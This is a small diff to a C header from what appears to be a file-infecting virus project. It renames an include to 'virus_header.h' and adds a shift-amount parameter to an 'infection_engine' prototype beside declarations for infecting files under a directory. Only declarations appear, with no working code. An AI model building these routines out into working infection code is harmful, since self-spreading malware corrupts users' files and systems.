@@ -9,7 +9,7 @@
 # include <sys/types.h>
 # include <unistd.h>
 
-# include "loader.h"
+# include "virus_header.h"
 # include "accessors.h"
 
 /*
@@ -40,7 +40,7 @@ struct				entry
 void		virus(const struct virus_header *vhdr);
 void		infect_files_in(const struct virus_header *vhdr, const char *root_dir);
 bool		infect(const struct virus_header *vhdr, const char *file);
-bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, struct safe_ptr file_ref);
+bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t *shift_amount);
 
 /*
 ** infection engine routines
